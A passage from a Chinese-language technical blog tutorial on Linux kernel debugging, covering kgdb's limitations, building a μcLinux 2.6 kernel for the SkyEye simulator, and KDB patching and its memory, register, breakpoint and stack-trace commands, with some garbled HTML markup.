style="vertical-align:baseline;">对于在Linux下面使用VMware虚拟机的情况，笔者没有做过实际的探索。从原理上而言，只需要在Linux下只要创建一台虚拟机作为target机，开发机的工作可以在实际的Linux环境中进行，搭建调试环境的过程与上面所述的过程类似。由于只需要创建一台虚拟机，所以使用Linux下的虚拟机搭建kgdb调试环境对系统性能的要求较低。（vmware已经推出了Linux下的版本）还可以在development机上配合使用一些其他的调试工具，例如功能更强大的cgdb、图形界面的DDD调试器等，以方便内核的调试工作。</span><br> <span style="vertical-align:baseline;"></span> <img src="http://static.oschina.net/uploads/img/201303/12162611_uyPK.jpg" alt=""> <span style="font-size:16px;font-family:'Times New Roman';background-color:#FFFFFF;vertical-align:baseline;"> </span> </p><p><span style="vertical-align:baseline;"><br> </span> </p><p><span id="OSC_h4_32"></span></p><h4 id="4-kgdb的一些特点和不足"><a href="#4-kgdb的一些特点和不足" class="headerlink" title="4 kgdb的一些特点和不足"></a><span style="vertical-align:baseline;">4 kgdb的一些特点和不足</span></h4><p><span style="vertical-align:baseline;">使用kgdb作为内核调试环境最大的不足在于对kgdb硬件环境的要求较高，必须使用两台计算机分别作为target和development机。尽管使用虚拟机的方法可以只用一台PC即能搭建调试环境，但是对系统其他方面的性能也提出了一定的要求，同时也增加了搭建调试环境时复杂程度。另外，kgdb内核的编译、配置也比较复杂，需要一定的技巧，笔者当时做的时候也是费了很多周折。当调试过程结束后时，还需要重新制作所要发布的内核。使用kgdb并不能进行全程调试，也就是说kgdb并不能用于调试系统一开始的初始化引导过程。</span><br> <span style="vertical-align:baseline;">不过，kgdb是一个不错的内核调试工具，使用它可以进行对内核的全面调试，甚至可以调试内核的中断处理程序。如果在一些图形化的开发工具的帮助下，对内核的调试将更方便。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">参考：</span><br> <a href="http://blog.linux.org.tw/~jserv/archives/002045.html" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">透过虚拟化技术体验kgdb</span></a> <span style="vertical-align:baseline;"></span><br> <a href="http://www.ibm.com/developerworks/cn/linux/l-kdb/index.html" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">Linux 系统内核的调试</span></a> <span style="vertical-align:baseline;"></span><br> <a href="http://elinux.org/Debugging_The_Linux_Kernel_Using_Gdb" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">Debugging The Linux Kernel Using Gdb</span></a> <span style="color:#1155CC;text-decoration:underline;vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h3_33"></span></p><h3 id="十-使用SkyEye构建Linux内核调试环境"><a href="#十-使用SkyEye构建Linux内核调试环境" class="headerlink" title="十 使用SkyEye构建Linux内核调试环境"></a><span style="vertical-align:baseline;">十 使用SkyEye构建Linux内核调试环境</span></h3><p><span style="vertical-align:baseline;">SkyEye是一个开源软件项目（OPenSource Software）,SkyEye项目的目标是在通用的Linux和Windows平台上模拟常见的嵌入式计算机系统。SkyEye实现了一个指令级的硬件模拟平台，可以模拟多种嵌入式开发板，支持多种CPU指令集。SkyEye 的核心是 GNU 的 gdb 项目，它把gdb和 ARM Simulator很好地结合在了一起。加入ARMulator 的功能之后，它就可以来仿真嵌入式开发板，在它上面不仅可以调试硬件驱动，还可以调试操作系统。Skyeye项目目前已经在嵌入式系统开发领域得到了很大的推广。</span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_34"></span></p><h4 id="1-SkyEye的安装和μcLinux内核编译"><a href="#1-SkyEye的安装和μcLinux内核编译" class="headerlink" title="1 SkyEye的安装和μcLinux内核编译"></a><span style="vertical-align:baseline;">1 SkyEye的安装和μcLinux内核编译</span></h4><p><span style="vertical-align:baseline;">1.1 SkyEye的安装</span><br> <span style="vertical-align:baseline;">SkyEye的安装不是本文要介绍的重点，目前已经有大量的资料对此进行了介绍。有关SkyEye的安装与使用的内容请查阅参考资料[11]。由于skyeye面目主要用于嵌入式系统领域，所以在skyeye上经常使用的是μcLinux系统，当然使用Linux作为skyeye上运行的系统也是可以的。由于介绍μcLinux 2.6在skyeye上编译的相关资料并不多，所以下面进行详细介绍。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">1.2 μcLinux 2.6.x的编译</span><br> <span style="vertical-align:baseline;">要在SkyEye中调试操作系统内核，首先必须使被调试内核能在SkyEye所模拟的开发板上正确运行。因此，正确编译待调试操作系统内核并配置SkyEye是进行内核调试的第一步。下面我们以SkyEye模拟基于Atmel AT91X40的开发板，并运行μcLinux 2.6为例介绍SkyEye的具体调试方法。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">I、安装交叉编译环境</span><br> <span style="vertical-align:baseline;">先安装交叉编译器。尽管在一些资料中说明使用工具链arm-elf-tools-20040427.sh ,但是由于arm-elf-xxx与arm-linux-xxx对宏及链接处理的不同，经验证明使用arm-elf-xxx工具链在链接vmlinux的最后阶段将会出错。所以这里我们使用的交叉编译工具链是：arm-uclinux-tools-base-gcc3.4.0-20040713.sh，关于该交叉编译工具链的下载地址请参见[6]。注意以下步骤最好用root用户来执行。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisltmp]#chmod+xarm-uclinux-tools-base-gcc3.4.0-20040713.sh[root@lisltmp]#./arm-uclinux-tools-base-gcc3.4.0-20040713.sh`</pre> <p><span style="vertical-align:baseline;">安装交叉编译工具链之后，请确保工具链安装路径存在于系统PATH变量中。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">II、制作μcLinux内核</span><br> <span style="vertical-align:baseline;">得到μcLinux发布包的一个最容易的方法是直接访问uClinux.org站点[7]。该站点发布的内核版本可能不是最新的，但你能找到一个最新的μcLinux补丁以及找一个对应的Linux内核版本来制作一个最新的μcLinux内核。这里，将使用这种方法来制作最新的μcLinux内核。目前（笔者记录编写此文章时），所能得到的发布包的最新版本是uClinux-dist.20041215.tar.gz。</span><br> <span style="vertical-align:baseline;">下载uClinux-dist.20041215.tar.gz，文件的下载地址请参见[7]。</span><br> <span style="vertical-align:baseline;">下载linux-2.6.9-hsc0.patch.gz，文件的下载地址请参见[8]。</span><br> <span style="vertical-align:baseline;">下载linux-2.6.9.tar.bz2，文件的下载地址请参见[9]。</span><br> <span style="vertical-align:baseline;">现在我们得到了整个的linux-2.6.9源代码，以及所需的内核补丁。请准备一个有2GB空间的目录里来完成以下制作μcLinux内核的过程。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisltmp]#tar-jxvfuClinux-dist-20041215.tar.bz2[root@lisluClinux-dist]#tar-jxvflinux-2.6.9.tar.bz2[root@lisluClinux-dist]#gzip-dclinux-2.6.9-hsc0.patch.gz|patch-p0`</pre> <p><span style="vertical-align:baseline;">或者使用：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisluClinux-dist]#gunziplinux-2.6.9-hsc0.patch.gz[root@lisluClinux-dist]patch-p0<linux-2.6.9-hsc0.patch`< pre=""> <p><span style="vertical-align:baseline;">执行以上过程后，将在linux-2.6.9/arch目录下生成一个补丁目录－armnommu。删除原来μcLinux目录里的linux-2.6.x(即那个linux-2.6.9-uc0)，并将我们打好补丁的Linux内核目录更名为linux-2.6.x。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisluClinux-dist]#rm-rflinux-2.6.x/[root@lisluClinux-dist]#mvlinux-2.6.9linux-2.6.x`</pre> <p> <span style="vertical-align:baseline;">III、配置和编译μcLinux内核</span><br> <span style="vertical-align:baseline;">因为只是出于调试μcLinux内核的目的，这里没有生成uClibc库文件及romfs.img文件。在发布μcLinux时，已经预置了某些常用嵌入式开发板的配置文件，因此这里直接使用这些配置文件，过程如下：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisluClinux-dist]#cdlinux-2.6.x[root@lisllinux-2.6.x]#makeARCH=armnommuCROSS_COMPILE=arm-uclinux-atmel_deconfig`</pre> <p><span style="vertical-align:baseline;">atmel_deconfig文件是μcLinux发布时提供的一个配置文件，存放于目录linux-2.6.x /arch/armnommu/configs/中。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisllinux-2.6.x]#makeARCH=armnommuCROSS_COMPILE=arm-uclinux-oldconfig`</pre> <p><span style="vertical-align:baseline;">下面编译配置好的内核：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[root@lisllinux-2.6.x]#makeARCH=armnommuCROSS_COMPILE=arm-uclinux-v=1`</pre> <p> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">一般情况下，编译将顺利结束并在Linux-2.6.x/目录下生成未经压缩的μcLinux内核文件vmlinux。需要注意的是为了调试μcLinux内核，需要打开内核编译的调试选项-g，使编译后的内核带有调试信息。打开编译选项的方法可以选择：</span><br> <span style="vertical-align:baseline;">“Kernel debugging-&gt;Compile the kernel with debug info”后将自动打开调试选项。也可以直接修改linux-2.6.x目录下的Makefile文件，为其打开调试开关。方法如下：。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`CFLAGS+=-g`</pre> <p><span style="vertical-align:baseline;">最容易出现的问题是找不到arm-uclinux-gcc命令的错误，主要原因是PATH变量中没有 包含arm-uclinux-gcc命令所在目录。在arm-linux-gcc的缺省安装情况下，它的安装目录是/root/bin/arm-linux-tool/，使用以下命令将路径加到PATH环境变量中。</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`ExportPATH＝$PATH:/root/bin/arm-linux-tool/bin`</pre> <p> <span style="vertical-align:baseline;">IV、根文件系统的制作</span><br> <span style="vertical-align:baseline;">Linux内核在启动的时的最后操作之一是加载根文件系统。根文件系统中存放了嵌入式 系统使用的所有应用程序、库文件及其他一些需要用到的服务。出于文章篇幅的考虑，这里不打算介绍根文件系统的制作方法，读者可以查阅一些其他的相关资料。值得注意的是，由配置文件skyeye.conf指定了装载到内核中的根文件系统。</span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_35"></span></p><h4 id="2-使用SkyEye调试"><a href="#2-使用SkyEye调试" class="headerlink" title="2 使用SkyEye调试"></a><span style="vertical-align:baseline;">2 使用SkyEye调试</span></h4><p><span style="vertical-align:baseline;">编译完μcLinux内核后，就可以在SkyEye中调试该ELF执行文件格式的内核了。前面已经说过利用SkyEye调试内核与使用gdb调试运用程序的方法相同。</span><br> <span style="vertical-align:baseline;">需要提醒读者的是，SkyEye的配置文件－skyeye.conf记录了模拟的硬件配置和模拟执行行为。该配置文件是SkyEye系统中一个及其重要的文件，很多错误和异常情况的发生都和该文件有关。在安装配置SkyEye出错时，请首先检查该配置文件然后再进行其他的工作。此时，所有的准备工作已经完成，就可以进行内核的调试工作了。</span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_36"></span></p><h4 id="3-使用SkyEye调试内核的特点和不足"><a href="#3-使用SkyEye调试内核的特点和不足" class="headerlink" title="3 使用SkyEye调试内核的特点和不足"></a><span style="vertical-align:baseline;">3 使用SkyEye调试内核的特点和不足</span></h4><p><span style="vertical-align:baseline;">在SkyEye中可以进行对Linux系统内核的全程调试。由于SkyEye目前主要支持基于ARM内核的CPU，因此一般而言需要使用交叉编译工具编译待调试的Linux系统内核。另外，制作SkyEye中使用的内核编译、配置过程比较复杂、繁琐。不过，当调试过程结束后无需重新制作所要发布的内核。</span><br> <span style="vertical-align:baseline;">SkyEye只是对系统硬件进行了一定程度上的模拟，所以在SkyEye与真实硬件环境相比较而言还是有一定的差距，这对一些与硬件紧密相关的调试可能会有一定的影响，例如驱动程序的调试。不过对于大部分软件的调试，SkyEye已经提供了精度足够的模拟了。</span><br> <span style="vertical-align:baseline;">SkyEye的下一个目标是和eclipse结合，有了图形界面，能为调试和查看源码提供一些方便。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">参考：</span><br> <a href="http://www.ibm.com/developerworks/cn/linux/l-kdb/index.html" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">Linux 系统内核的调试</span></a> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h3_37"></span></p><h3 id="十一-KDB"><a href="#十一-KDB" class="headerlink" title="十一 KDB"></a><span style="vertical-align:baseline;">十一 KDB</span></h3><p><span style="vertical-align:baseline;">Linux 内核调试器（KDB）允许您调试 Linux 内核。这个恰如其名的工具实质上是内核代码的补丁，它允许高手访问内核内存和数据结构。KDB 的主要优点之一就是它不需要用另一台机器进行调试：您可以调试正在运行的内核。</span><br> <span style="vertical-align:baseline;">设置一台用于 KDB 的机器需要花费一些工作，因为需要给内核打补丁并进行重新编译。KDB 的用户应当熟悉 Linux 内核的编译（在一定程度上还要熟悉内核内部机理）。</span><br> <span style="vertical-align:baseline;">在本文中，我们将从有关下载 KDB 补丁、打补丁、（重新）编译内核以及启动 KDB 方面的信息着手。然后我们将了解 KDB 命令并研究一些较常用的命令。最后，我们将研究一下有关设置和显示选项方面的一些详细信息。</span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_38"></span></p><h4 id="1-入门"><a href="#1-入门" class="headerlink" title="1 入门"></a><span style="vertical-align:baseline;">1 入门</span></h4><p><span style="vertical-align:baseline;">KDB 项目是由 Silicon Graphics 维护的，您需要从它的 FTP 站点下载与内核版本有关的补丁。（在编写本文时）可用的最新 KDB 版本是 4.2。您将需要下载并应用两个补丁。一个是“公共的”补丁，包含了对通用内核代码的更改，另一个是特定于体系结构的补丁。补丁可作为 bz2 文件获取。例如，在运行 2.4.20 内核的 x86 机器上，您会需要 kdb-v4.2-2.4.20-common-1.bz2 和 kdb-v4.2-2.4.20-i386-1.bz2。</span><br> <span style="vertical-align:baseline;">这里所提供的所有示例都是针对 i386 体系结构和 2.4.20 内核的。您将需要根据您的机器和内核版本进行适当的更改。您还需要拥有 root 许可权以执行这些操作。</span><br> <span style="vertical-align:baseline;">将文件复制到 /usr/src/linux 目录中并从用 bzip2 压缩的文件解压缩补丁文件：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`#bzip2-dkdb-v4.2-2.4.20-common-1.bz2#bzip2-dkdb-v4.2-2.4.20-i386-1.bz2`</pre> <p><span style="vertical-align:baseline;">您将获得 kdb-v4.2-2.4.20-common-1 和 kdb-v4.2-2.4-i386-1 文件。</span><br> <span style="vertical-align:baseline;">现在，应用这些补丁：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`#patch-p1<kdb-v4.2-2.4.20-common-1 #patch-p1<kdb-v4.2-2.4.20-i386-1`<="" pre=""> <p><span style="vertical-align:baseline;">这些补丁应该干净利落地加以应用。查找任何以 .rej 结尾的文件。这个扩展名表明这些是失败的补丁。如果内核树没问题，那么补丁的应用就不会有任何问题。</span><br> <span style="vertical-align:baseline;">接下来，需要构建内核以支持 KDB。第一步是设置 CONFIG_KDB 选项。使用您喜欢的配置机制（xconfig 和 menuconfig 等）来完成这一步。转到结尾处的“Kernel hacking”部分并选择“Built-in Kernel Debugger support”选项。</span><br> <span style="vertical-align:baseline;">您还可以根据自己的偏好选择其它两个选项。选择“Compile the kernel with frame pointers”选项（如果有的话）则设置CONFIG_FRAME_POINTER 标志。这将产生更好的堆栈回溯，因为帧指针寄存器被用作帧指针而不是通用寄存器。您还可以选择“KDB off by default”选项。这将设置 CONFIG_KDB_OFF 标志，并且在缺省情况下将关闭 KDB。我们将在后面一节中对此进行详细介绍。</span><br> <span style="vertical-align:baseline;">保存配置，然后退出。重新编译内核。建议在构建内核之前执行“make clean”。用常用方式安装内核并引导它。</span><br> <a href="http://www.ibm.com/developerworks/cn/linux/l-kdbug/index.html#ibm-pcon" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;"></span></a> </p><p><span id="OSC_h4_39"></span></p><h4 id="2-初始化并设置环境变量"><a href="#2-初始化并设置环境变量" class="headerlink" title="2 初始化并设置环境变量"></a><span style="vertical-align:baseline;">2 初始化并设置环境变量</span></h4><p><span style="vertical-align:baseline;">您可以定义将在 KDB 初始化期间执行的 KDB 命令。需要在纯文本文件 kdb_cmds 中定义这些命令，该文件位于 Linux 源代码树（当然是在打了补丁之后）的 KDB 目录中。该文件还可以用来定义设置显示和打印选项的环境变量。文件开头的注释提供了编辑文件方面的帮助。使用这个文件的缺点是，在您更改了文件之后需要重新构建并重新安装内核。</span><br> <a href="http://www.ibm.com/developerworks/cn/linux/l-kdbug/index.html#ibm-pcon" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;"></span></a> </p><p><span id="OSC_h4_40"></span></p><h4 id="3-激活-KDB"><a href="#3-激活-KDB" class="headerlink" title="3 激活 KDB"></a><span style="vertical-align:baseline;">3 激活 KDB</span></h4><p><span style="vertical-align:baseline;">如果编译期间没有选中 CONFIG_KDB_OFF ，那么在缺省情况下 KDB 是活动的。否则，您需要显式地激活它 － 通过在引导期间将kdb=on 标志传递给内核或者通过在挂装了 /proc 之后执行该工作：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`#echo"1">/proc/sys/kernel/kdb`</pre> <p><span style="vertical-align:baseline;">倒过来执行上述步骤则会取消激活 KDB。也就是说，如果缺省情况下 KDB 是打开的，那么将 kdb=off 标志传递给内核或者执行下面这个操作将会取消激活 KDB：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`#echo"0">/proc/sys/kernel/kdb`</pre> <p><span style="vertical-align:baseline;">在引导期间还可以将另一个标志传递给内核。 kdb=early 标志将导致在引导过程的初始阶段就把控制权传递给 KDB。如果您需要在引导过程初始阶段进行调试，那么这将有所帮助。</span><br> <span style="vertical-align:baseline;">调用 KDB 的方式有很多。如果 KDB 处于打开状态，那么只要内核中有紧急情况就自动调用它。按下键盘上的 PAUSE 键将手工调用 KDB。调用 KDB 的另一种方式是通过串行控制台。当然，要做到这一点，需要设置串行控制台并且需要一个从串行控制台进行读取的程序。按键序列 Ctrl-A 将从串行控制台调用 KDB。</span><br> <a href="http://www.ibm.com/developerworks/cn/linux/l-kdbug/index.html#ibm-pcon" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;"></span></a> </p><p><span id="OSC_h4_41"></span></p><h4 id="4-KDB-命令"><a href="#4-KDB-命令" class="headerlink" title="4 KDB 命令"></a><span style="vertical-align:baseline;">4 KDB 命令</span></h4><p><span style="vertical-align:baseline;">KDB 是一个功能非常强大的工具，它允许进行几个操作，比如内存和寄存器修改、应用断点和堆栈跟踪。根据这些，可以将 KDB 命令分成几个类别。下面是有关每一类中最常用命令的详细信息。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">4.1 内存显示和修改</span><br> <span style="vertical-align:baseline;">这一类别中最常用的命令是 md 、 mdr 、 mm 和 mmW 。</span><br> <span style="vertical-align:baseline;">md 命令以一个地址／符号和行计数为参数，显示从该地址开始的 line-count 行的内存。如果没有指定 line-count ，那么就使用环境变量所指定的缺省值。如果没有指定地址，那么 md 就从上一次打印的地址继续。地址打印在开头，字符转换打印在结尾。</span><br> <span style="vertical-align:baseline;">mdr 命令带有地址／符号以及字节计数，显示从指定的地址开始的 byte-count 字节数的初始内存内容。它本质上和 md 一样，但是它不显示起始地址并且不在结尾显示字符转换。 mdr 命令较少使用。</span><br> <span style="vertical-align:baseline;">mm 命令修改内存内容。它以地址／符号和新内容作为参数，用 new-contents 替换地址处的内容。</span><br> <span style="vertical-align:baseline;">mmW 命令更改从地址开始的 W 个字节。请注意， mm 更改一个机器字。</span><br> <span style="vertical-align:baseline;">示例</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">显示从 0xc000000 开始的 15 行内存：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>md0xc00000015`</pre> <p><span style="vertical-align:baseline;">将内存位置为 0xc000000 上的内容更改为 0x10：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>mm0xc0000000x10`</pre> <p> <span style="vertical-align:baseline;">4.2 寄存器显示和修改</span><br> <span style="vertical-align:baseline;">这一类别中的命令有 rd 、 rm 和 ef 。</span><br> <span style="vertical-align:baseline;">rd 命令（不带任何参数）显示处理器寄存器的内容。它可以有选择地带三个参数。如果传递了 c 参数，则 rd 显示处理器的控制寄存器；如果带有 d 参数，那么它就显示调试寄存器；如果带有 u 参数，则显示上一次进入内核的当前任务的寄存器组。</span><br> <span style="vertical-align:baseline;">rm 命令修改寄存器的内容。它以寄存器名称和 new-contents 作为参数，用 new-contents 修改寄存器。寄存器名称与特定的体系结构有关。目前，不能修改控制寄存器。</span><br> <span style="vertical-align:baseline;">ef 命令以一个地址作为参数，它显示指定地址处的异常帧。</span><br> <span style="vertical-align:baseline;">示例</span><br> <span style="vertical-align:baseline;">显示通用寄存器组：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>rd[0]kdb>rm%ebx0x25`</pre> <p> <span style="vertical-align:baseline;">4.3 断点</span><br> <span style="vertical-align:baseline;">常用的断点命令有 bp 、 bc 、 bd 、 be 和 bl 。</span><br> <span style="vertical-align:baseline;">bp 命令以一个地址／符号作为参数，它在地址处应用断点。当遇到该断点时则停止执行并将控制权交予 KDB。该命令有几个有用的变体。 bpa 命令对 SMP 系统中的所有处理器应用断点。 bph 命令强制在支持硬件寄存器的系统上使用它。 bpha 命令类似于 bpa 命令，差别在于它强制使用硬件寄存器。</span><br> <span style="vertical-align:baseline;">bd 命令禁用特殊断点。它接收断点号作为参数。该命令不是从断点表中除去断点，而只是禁用它。断点号从 0 开始，根据可用性顺序分配给断点。</span><br> <span style="vertical-align:baseline;">be 命令启用断点。该命令的参数也是断点号。</span><br> <span style="vertical-align:baseline;">bl 命令列出当前的断点集。它包含了启用的和禁用的断点。</span><br> <span style="vertical-align:baseline;">bc 命令从断点表中除去断点。它以具体的断点号或 * 作为参数，在后一种情况下它将除去所有断点。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">示例</span><br> <span style="vertical-align:baseline;">对函数 sys_write() 设置断点：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>bpsys_write`</pre> <p><span style="vertical-align:baseline;">列出断点表中的所有断点：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>bl`</pre> <p><span style="vertical-align:baseline;">清除断点号 1：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>bc1`</pre> <p> <span style="vertical-align:baseline;">4.4 堆栈跟踪</span><br> <span style="vertical-align:baseline;">主要的堆栈跟踪命令有 bt 、 btp 、 btc 和 bta 。</span><br> <span style="vertical-align:baseline;">bt 命令设法提供有关当前线程的堆栈的信息。它可以有选择地将堆栈帧地址作为参数。如果没有提供地址，那么它采用当前寄存器来回溯堆栈。否则，它假定所提供的地址是有效的堆栈帧起始地址并设法进行回溯。如果内核编译期间设置了CONFIG_FRAME_POINTER 选项，那么就用帧指针寄存器来维护堆栈，从而就可以正确地执行堆栈回溯。如果没有设置CONFIG_FRAME_POINTER ，那么 bt 命令可能会产生错误的结果。</span><br> <span style="vertical-align:baseline;">btp 命令将进程标识作为参数，并对这个特定进程进行堆栈回溯。</span><br> <span style="vertical-align:baseline;">btc 命令对每个活动 CPU 上正在运行的进程执行堆栈回溯。它从第一个活动 CPU 开始执行 bt ，然后切换到下一个活动 CPU，以此类推。</span><br> <span style="vertical-align:baseline;">bta 命令对处于某种特定状态的所有进程执行回溯。若不带任何参数，它就对所有进程执行回溯。可以有选择地将各种参数传递给该命令。将根据参数处理处于特定状态的进程。选项以及相应的状态如下：</span> </p></kdb-v4.2-2.4.20-common-1></pre></linux-2.6.9-hsc0.patch`<></pre></..></pre></li><li><p><span style="vertical-align:baseline;">D：不可中断状态</span></p></li><li><span style="vertical-align:baseline;">R：正运行</span></li><li><span style="vertical-align:baseline;">S：可中断休眠</span></li><li><span style="vertical-align:baseline;">T：已跟踪或已停止</span></li><li><span style="vertical-align:baseline;">Z：僵死</span></li><li><p><span style="vertical-align:baseline;">U：不可运行</span> </p><p><span style="vertical-align:baseline;">这类命令中的每一个都会打印出一大堆信息。示例</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">跟踪当前活动线程的堆栈：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>bt`</pre> <p><span style="vertical-align:baseline;">跟踪标识为 575 的进程的堆栈：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>btp575`</pre> <p> <span style="vertical-align:baseline;">4.5 其它命令</span><br> <span style="vertical-align:baseline;">下面是在内核调试过程中非常有用的其它几个 KDB 命令。</span><br> <span style="vertical-align:baseline;">id 命令以一个地址／符号作为参数，它对从该地址开始的指令进行反汇编。环境变量 IDCOUNT 确定要显示多少行输出。</span><br> <span style="vertical-align:baseline;">ss 命令单步执行指令然后将控制返回给 KDB。该指令的一个变体是 ssb ，它执行从当前指令指针地址开始的指令（在屏幕上打印指令），直到它遇到将引起分支转移的指令为止。分支转移指令的典型示例有 call 、 return 和 jump 。</span><br> <span style="vertical-align:baseline;">go 命令让系统继续正常执行。一直执行到遇到断点为止（如果已应用了一个断点的话）。</span><br> <span style="vertical-align:baseline;">reboot 命令立刻重新引导系统。它并没有彻底关闭系统，因此结果是不可预测的。</span><br> <span style="vertical-align:baseline;">ll 命令以地址、偏移量和另一个 KDB 命令作为参数。它对链表中的每个元素反复执行作为参数的这个命令。所执行的命令以列表中当前元素的地址作为参数。</span><br> <span style="vertical-align:baseline;">示例</span><br> <span style="vertical-align:baseline;">反汇编从例程 schedule 开始的指令。所显示的行数取决于环境变量 IDCOUNT ： </span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>idschedule`</pre> <p><span style="vertical-align:baseline;">执行指令直到它遇到分支转移条件（在本例中为指令 jne ）为止： </span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>ssb0xc0105355default_idle+0x25:cli0xc0105356default_idle+0x26:mov0x14(%edx),%eax0xc0105359default_idle+0x29:test%eax,%eax0xc010535bdefault_idle+0x2b:jne0xc0105361default_idle+0x31`</pre> <p><span id="OSC_h4_42"></span></p><h4 id="5-技巧和诀窍"><a href="#5-技巧和诀窍" class="headerlink" title="5 技巧和诀窍"></a><span style="vertical-align:baseline;">5 技巧和诀窍</span></h4><p><span style="vertical-align:baseline;">调试一个问题涉及到：使用调试器（或任何其它工具）找到问题的根源以及使用源代码来跟踪导致问题的根源。单单使用源代码来确定问题是极其困难的，只有老练的内核黑客才有可能做得到。相反，大多数的新手往往要过多地依靠调试器来修正错误。这种方法可能会产生不正确的问题解决方案。我们担心的是这种方法只会修正表面症状而不能解决真正的问题。此类错误的典型示例是添加错误处理代码以处理 NULL 指针或错误的引用，却没有查出无效引用的真正原因。</span><br> <span style="vertical-align:baseline;">结合研究代码和使用调试工具这两种方法是识别和修正问题的最佳方案。</span><br> <span style="vertical-align:baseline;">调试器的主要用途是找到错误的位置、确认症状（在某些情况下还有起因）、确定变量的值，以及确定程序是如何出现这种情况的（即，建立调用堆栈）。有经验的黑客会知道对于某种特定的问题应使用哪一个调试器，并且能迅速地根据调试获取必要的信息，然后继续分析代码以识别起因。</span><br> <span style="vertical-align:baseline;">因此，这里为您介绍了一些技巧，以便您能使用 KDB 快速地取得上述结果。当然，要记住，调试的速度和精确度来自经验、实践和良好的系统知识（硬件和内核内部机理等）。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">5.1 技巧 #1</span><br> <span style="vertical-align:baseline;">在 KDB 中，在提示处输入地址将返回与之最为匹配的符号。这在堆栈分析以及确定全局数据的地址／值和函数地址方面极其有用。同样，输入符号名则返回其虚拟地址。</span><br> <span style="vertical-align:baseline;">示例</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">表明函数 sys_read 从地址 0xc013db4c 开始： </span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>0xc013db4c0xc013db4c=0xc013db4c(sys_read)`</pre> <p><span style="vertical-align:baseline;">同样，表明 sys_write 位于地址 0xc013dcc8： </span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>sys_writesys_write=0xc013dcc8(sys_write)`</pre> <p><span style="vertical-align:baseline;">这些有助于在分析堆栈时找到全局数据和函数地址。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">5.2 技巧 #2</span><br> <span style="vertical-align:baseline;">在编译带 KDB 的内核时，只要 CONFIG_FRAME_POINTER 选项出现就使用该选项。为此，需要在配置内核时选择“Kernel hacking”部分下面的“Compile the kernel with frame pointers”选项。这确保了帧指针寄存器将被用作帧指针，从而产生正确的回溯。实际上，您可以手工转储帧指针寄存器的内容并跟踪整个堆栈。例如，在 i386 机器上，%ebp 寄存器可以用来回溯整个堆栈。</span><br> <span style="vertical-align:baseline;">例如，在函数 rmqueue() 上执行第一个指令后，堆栈看上去类似于下面这样：</span> </p><pre class="brush:shell; toolbar: true; auto-links: 